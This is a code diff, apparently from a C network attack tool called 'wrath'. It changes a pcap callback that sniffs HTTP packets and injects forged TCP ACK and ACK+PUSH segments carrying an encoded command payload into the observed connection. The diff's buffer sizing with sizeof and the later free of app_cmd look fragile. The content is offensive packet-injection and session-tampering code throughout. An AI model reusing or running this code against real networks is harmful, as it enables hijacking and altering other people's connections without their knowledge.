@@ -38,13 +38,17 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	 * protocol */
 	char *op = cline_args->operation;
 	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) { // HTTP response
-		char *app_cmd_con = (char *) malloc(sizeof(app_cmd));
+		char *app_cmd_con = (char *) safe_malloc(sizeof(app_cmd));
+		wrath_char_encode(app_cmd, app_cmd_con);
 		if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
 			printf("HTTP Packet sniffed\n");
-			wrath_tcp_belly_build_and_launch(args, packet, NULL, TH_ACK);	
-			wrath_tcp_belly_build_and_launch(args, packet, app_cmd_con, (TH_ACK + TH_PUSH));
+			wrath_tcp_belly_build_and_launch(args, packet, NULL, TH_ACK, 0);	
+			wrath_tcp_belly_build_and_launch(args, packet, app_cmd_con, (TH_ACK + TH_PUSH), 1);
 		}
+		free(app_cmd_con);
 	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
 	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
 			wrath_tcp_raw_build_and_launch(args, packet);
+
+	free(app_cmd);
 }
